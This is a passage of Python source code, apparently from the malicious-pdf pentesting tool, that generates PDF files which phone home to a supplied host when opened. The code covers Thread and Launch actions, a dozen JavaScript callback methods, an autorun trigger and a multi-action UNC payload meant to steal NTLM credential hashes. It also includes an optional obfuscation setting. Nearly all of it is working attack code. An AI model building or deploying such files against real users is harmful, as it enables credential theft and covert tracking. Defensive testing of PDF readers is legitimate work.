     /Length 0
  >>
stream
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000600 00000 n
0000000750 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
1000
%%EOF
''')


# PDF101 Research: Thread action callback
# Uses /S /Thread action with remote FileSpec to fetch an external thread
# A distinct PDF action type separate from URI, Launch, GoToR, GoToE
# Source: https://github.com/RUB-NDS/PDF101
def create_malpdf31(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'thread'      ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /Thread
     /F << /Type /FileSpec /F (''' + host + '''/test31.pdf) /V true /FS /URL >>
     /D 0
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000080 00000 n
0000000181 00000 n
0000000450 00000 n
0000000570 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
800
%%EOF
''')


# PDF101 Research: Launch action with /print operation
# Uses /Launch with /Win << /O /print >> to force fetching a remote file for printing
# Different from plain /Launch (test6) - the print flag causes a network fetch
# Source: https://github.com/RUB-NDS/PDF101
def create_malpdf32(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'launch-print') Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /Launch
     /F << /Type /FileSpec /F (''' + host + '''/test32.pdf) /V true /FS /URL >>
     /Win << /O /print >>
     /NewWindow false
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000080 00000 n
0000000181 00000 n
0000000450 00000 n
0000000570 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
830
%%EOF
''')


# PDF101 Research: JavaScript callback methods (individual test cases)
# Each function tests a single JS phone-home method for isolated testing
# Source: https://github.com/RUB-NDS/PDF101

def _js_callback_pdf(filename, host, js_code, label):
    """Helper to generate a minimal PDF with a single JavaScript callback."""
    with open(filename, "w") as file:
        file.write('''%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(''' + js_code + ''')
      >>
  >>
>>''')


# test33.1: this.submitForm() - Acrobat JS form submission
def create_malpdf33_1(filename, host):
    _js_callback_pdf(filename, host,
        'this.submitForm({cURL: "' + host + '/test33_1-submitform"})',
        'js-submitform')

# test33.2: this.getURL() - Acrobat JS URL fetch
def create_malpdf33_2(filename, host):
    _js_callback_pdf(filename, host,
        'this.getURL("' + host + '/test33_2-geturl")',
        'js-geturl')

# test33.3: app.launchURL() - Acrobat JS launch URL
def create_malpdf33_3(filename, host):
    _js_callback_pdf(filename, host,
        'app.launchURL("' + host + '/test33_3-launchurl")',
        'js-launchurl')

# test33.4: app.media.getURLData() - Acrobat JS media fetch
def create_malpdf33_4(filename, host):
    _js_callback_pdf(filename, host,
        'app.media.getURLData("' + host + '/test33_4-geturldata", "audio/mp3")',
        'js-geturldata')

# test33.5: SOAP.connect() - Acrobat JS SOAP connection
def create_malpdf33_5(filename, host):
    _js_callback_pdf(filename, host,
        'SOAP.connect("' + host + '/test33_5-soap-connect")',
        'js-soap-connect')

# test33.6: SOAP.request() - Acrobat JS SOAP request
def create_malpdf33_6(filename, host):
    _js_callback_pdf(filename, host,
        'SOAP.request({cURL:"' + host + '/test33_6-soap-request",oRequest:{},cAction:""})',
        'js-soap-request')

# test33.7: this.importDataObject() - Acrobat JS data import
def create_malpdf33_7(filename, host):
    _js_callback_pdf(filename, host,
        'this.importDataObject("file","' + host + '/test33_7-dataobject")',
        'js-dataobject')

# test33.8: app.openDoc() - Acrobat JS open document
def create_malpdf33_8(filename, host):
    _js_callback_pdf(filename, host,
        'app.openDoc("' + host + '/test33_8-opendoc")',
        'js-opendoc')

# test33.9: fetch() - Web API (PDF.js / browser context)
def create_malpdf33_9(filename, host):
    _js_callback_pdf(filename, host,
        'fetch("' + host + '/test33_9-fetch")',
        'js-fetch')

# test33.10: XMLHttpRequest - Web API (PDF.js / browser context)
def create_malpdf33_10(filename, host):
    _js_callback_pdf(filename, host,
        'var r=new XMLHttpRequest();r.open("GET","' + host + '/test33_10-xhr");r.send()',
        'js-xhr')

# test33.11: new Image() - Web API (PDF.js / browser context)
def create_malpdf33_11(filename, host):
    _js_callback_pdf(filename, host,
        'var img=new Image(1,1);img.src="' + host + '/test33_11-img"',
        'js-img')

# test33.12: WebSocket - Web API (PDF.js / browser context)
def create_malpdf33_12(filename, host):
    ws_host = host.replace('https://', 'wss://').replace('http://', 'ws://')
    _js_callback_pdf(filename, host,
        'new WebSocket("' + ws_host + '/test33_12-ws")',
        'js-ws')


# PDF101 Research: UNC credential theft via multiple action types
# Tests NTLM hash theft through all major PDF action types using UNC paths
# Covers XObject stream, Launch, Thread, GoToR, SubmitForm, URI, and JavaScript
# Source: https://github.com/RUB-NDS/PDF101
def create_malpdf34(filename, host):
    # Strip scheme for UNC path
    unc_host = host.replace('https://', '').replace('http://', '').split('/')[0]
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 6 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
         /XObject << /Im0 5 0 R >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'unc-multi'   ) Tj
  ET
  /Im0 Do
endstream
endobj

5 0 obj
  << /Type /XObject
     /Subtype /Image
     /Width 1
     /Height 1
     /BitsPerComponent 8
     /ColorSpace /DeviceRGB
     /F (\\\\''' + unc_host + '''\\test34-xobj.jpg)
     /Length 0
  >>
stream
endstream
endobj

6 0 obj
  << /Type /Action
     /S /JavaScript
     /JS (
try {this.submitForm({cURL: "\\\\\\\\''' + unc_host + '''\\\\test34-submitform.fdf"});} catch(e) {}
try {this.getURL("\\\\\\\\''' + unc_host + '''\\\\test34-geturl.pdf");} catch(e) {}
try {app.launchURL("\\\\\\\\''' + unc_host + '''\\\\test34-launchurl.pdf");} catch(e) {}
try {SOAP.connect("\\\\\\\\''' + unc_host + '''\\\\test34-soap.pdf");} catch(e) {}
try {app.openDoc("\\\\\\\\''' + unc_host + '''\\\\test34-opendoc.pdf");} catch(e) {}
     )
     /Next 7 0 R
  >>
endobj

7 0 obj
  << /Type /Action
     /S /GoToR
     /F << /Type /FileSpec /F (\\\\''' + unc_host + '''\\test34-gotor.pdf) /V true >>
     /D [0 /Fit]
     /Next 8 0 R
  >>
endobj

8 0 obj
  << /Type /Action
     /S /Thread
     /F << /Type /FileSpec /F (\\\\''' + unc_host + '''\\test34-thread.pdf) /V true >>
     /D 0
     /Next 9 0 R
  >>
endobj

9 0 obj
  << /Type /Action
     /S /URI
     /URI (\\\\''' + unc_host + '''\\test34-uri)
  >>
endobj

xref
0 10
0000000000 65535 f
0000000010 00000 n
0000000080 00000 n
0000000181 00000 n
0000000500 00000 n
0000000650 00000 n
0000000850 00000 n
0000001300 00000 n
0000001500 00000 n
0000001700 00000 n
trailer
  << /Root 1 0 R
     /Size 10
  >>
startxref
1850
%%EOF
''')


# PDF101 Research: /Names dictionary trigger
# Uses catalog-level /Names with /JavaScript to auto-execute on document open
# Different trigger mechanism from /OpenAction and /AA page/annotation events
# Source: https://github.com/RUB-NDS/PDF101
def create_malpdf35(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /Names << /JavaScript << /Names [(autorun) 5 0 R] >> >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'names-js'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /JavaScript
     /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test35"), cFS: "CHTTP"}))
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000120 00000 n
0000000221 00000 n
0000000490 00000 n
0000000610 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
800
%%EOF
''')


_PDF_COMMENT = b'% Generated by malicious-pdf - https://github.com/jonaslejon/malicious-pdf\n'
_PDF_INFO = b' /Info << /Creator (malicious-pdf) /Producer (https://github.com/jonaslejon/malicious-pdf) >>'


def _inject_credit(output_dir, file_extensions):
    """Inject credit comment and Info dict metadata into generated PDFs."""
    for filepath in output_dir.iterdir():
        if filepath.suffix == '.svg':
            continue
        try:
            data = filepath.read_bytes()

            # Method 3: Insert comment after %PDF-x.x header line
            newline_idx = data.index(b'\n') + 1
            data = data[:newline_idx] + _PDF_COMMENT + data[newline_idx:]

            # Method 1: Insert /Info in trailer dict
            # Find the last trailer and inject /Info before its final >>
            trailer_idx = data.rfind(b'trailer')
            if trailer_idx != -1:
                trailer_section = data[trailer_idx:]
                if b'/Info' not in trailer_section:
                    # Find the last >> in the trailer section (the outermost dict close)
                    last_close = trailer_section.rfind(b'>>')
                    if last_close != -1:
                        insert_pos = trailer_idx + last_close
                        data = data[:insert_pos] + _PDF_INFO + b'\n  ' + data[insert_pos:]

            filepath.write_bytes(data)
        except Exception:
            pass  # Skip files that don't have standard PDF structure (e.g., test11 EICAR)


def main():
    """Main function to generate malicious PDFs."""
    parser = argparse.ArgumentParser(
        description="Generate 47 malicious PDF files with phone-home functionality for penetration testing. "
                    "Covers URI actions, JavaScript execution, form submission, annotation injection, "
                    "widget-based XSS, content extraction, and more. "
                    "Use with Burp Collaborator or Interact.sh to detect callbacks."
    )
    parser.add_argument("host", help="Callback URL or IP address (e.g. https://burp-collaborator-url)")
    parser.add_argument("--output-dir", default="output", help="Directory to save generated PDF files (default: output/)")
    parser.add_argument("--no-credit", action="store_true", help="Do not embed credit/attribution metadata in generated PDFs")
    parser.add_argument("--obfuscate", type=int, choices=[0, 1, 2, 3], default=0, metavar="LEVEL",
                        help="Obfuscation level: 0=none (default), 1=name/string encoding, 2=+JS/XSS obfuscation, 3=+stream compression")
    args = parser.parse_args()

    host = args.host
    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    if not validate_url_or_ip_validators(host):
        print("Error: Invalid URL or IP address. Input must have a scheme (e.g. https://) or be a valid IP address.")
        sys.exit(1)

    print("[+] Creating PDF files..")

    pdf_generators = {
        1: (create_malpdf, f'\\\\{host}\\test'),
        1.1: (create_malpdf, ensure_scheme(host)),
        2: (create_malpdf2, ensure_scheme(host)),
        3: (create_malpdf3, ensure_scheme(host)),
        4: (create_malpdf4, host),
        5: (create_malpdf5, ensure_scheme(host)),
        6: (create_malpdf6, ensure_scheme(host)),
        7: (create_malpdf7, ensure_scheme(host)),
        8: (create_malpdf8, ensure_scheme(host)),
        9: (create_malpdf9, ensure_scheme(host)),
        10: (create_malpdf10, ensure_scheme(host)),
        11: (create_malpdf11, None),
        12: (create_malpdf12, ensure_scheme(host)),
        13: (create_malpdf13, ensure_scheme(host)),
        14: (create_malpdf14, ensure_scheme(host)),
        15: (create_malpdf15, ensure_scheme(host)),
        16: (create_malpdf16, ensure_scheme(host)),
        17: (create_malpdf17, ensure_scheme(host)),
        18: (create_malpdf18, ensure_scheme(host)),
        19: (create_malpdf19, ensure_scheme(host)),
        20: (create_malpdf20, ensure_scheme(host)),
        21: (create_malpdf21, ensure_scheme(host)),
        22: (create_malpdf22, ensure_scheme(host)),
        23: (create_malpdf23, ensure_scheme(host)),
        24: (create_malpdf24, ensure_scheme(host)),
        25: (create_malpdf25, ensure_scheme(host)),
        26: (create_malpdf26, ensure_scheme(host)),
        27: (create_malpdf27, ensure_scheme(host)),
        28: (create_malpdf28, ensure_scheme(host)),
        29: (create_malpdf29, ensure_scheme(host)),
        30: (create_malpdf30, ensure_scheme(host)),
        31: (create_malpdf31, ensure_scheme(host)),
        32: (create_malpdf32, ensure_scheme(host)),
        '33_1': (create_malpdf33_1, ensure_scheme(host)),
        '33_2': (create_malpdf33_2, ensure_scheme(host)),
        '33_3': (create_malpdf33_3, ensure_scheme(host)),
        '33_4': (create_malpdf33_4, ensure_scheme(host)),
        '33_5': (create_malpdf33_5, ensure_scheme(host)),
        '33_6': (create_malpdf33_6, ensure_scheme(host)),
        '33_7': (create_malpdf33_7, ensure_scheme(host)),
        '33_8': (create_malpdf33_8, ensure_scheme(host)),
        '33_9': (create_malpdf33_9, ensure_scheme(host)),
        '33_10': (create_malpdf33_10, ensure_scheme(host)),
        '33_11': (create_malpdf33_11, ensure_scheme(host)),
        '33_12': (create_malpdf33_12, ensure_scheme(host)),
        34: (create_malpdf34, host),
        35: (create_malpdf35, ensure_scheme(host)),
    }

    file_extensions = {14: '.svg'}

    for num, (func, content) in pdf_generators.items():
        ext = file_extensions.get(num, '.pdf')
        if isinstance(num, str):
            name = f"test{num}{ext}"
        elif isinstance(num, float):
            name = f"test{int(num)}_{str(num).split('.')[1]}{ext}"
        else:
            name = f"test{num}{ext}"
        filename = output_dir / name
        if content:
            func(filename, content)
        else:
            func(filename)

    if not args.no_credit:
        _inject_credit(output_dir, file_extensions)

    if args.obfuscate > 0:
        print(f"[+] Applying obfuscation level {args.obfuscate}...")
        for filepath in output_dir.iterdir():
            if filepath.suffix in ('.pdf',):
                obfuscate_pdf(filepath, args.obfuscate)

    print("[-] Done!")

if __name__ == "__main__":
    if sys.version_info[0] < 3:
        raise SystemExit("Use Python 3 (or higher) only")
    main()
